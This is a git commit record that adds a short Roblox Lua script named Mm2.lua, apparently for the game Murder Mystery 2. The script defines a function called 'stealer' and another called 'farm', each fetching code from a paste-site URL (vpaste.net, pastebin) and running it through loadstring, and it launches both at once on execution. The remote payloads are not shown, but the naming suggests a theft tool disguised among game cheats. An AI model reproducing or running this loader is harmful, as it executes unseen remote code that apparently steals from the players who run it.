f32c45a23a0dc3ae43eff97d310622b268ef5816
RoshiroGaming32 <basiliojerico37@gmail.com>
2025-04-04 01:10:54 +0800

    Create Mm2.lua

---
+++ Mm2.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("http://vpaste.net/R1X6Z", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Ea2fXndi"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
